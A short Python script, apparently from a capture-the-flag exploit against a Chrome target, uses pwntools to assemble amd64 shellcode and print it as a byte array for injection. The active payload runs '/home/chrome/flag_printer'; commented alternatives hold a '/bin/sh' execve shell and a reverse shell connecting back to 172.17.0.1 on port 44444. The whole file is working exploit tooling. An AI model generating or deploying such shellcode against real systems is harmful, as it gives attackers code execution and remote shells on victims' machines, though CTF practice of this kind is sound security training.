#!/usr/bin/env python3

from pwn import *
context.arch = "amd64"

#sc = asm(shellcraft.linux.execve("/bin/sh", 0, 0))
#sc = asm(shellcraft.connect('172.17.0.1',44444)+shellcraft.dupsh())
sc = asm(shellcraft.execve('/home/chrome/flag_printer'))

out = "sc = [";

for c in sc:
    out+= hex(c) + ",";

out = out.strip(",") + "];"
print(len(sc))
print(out)
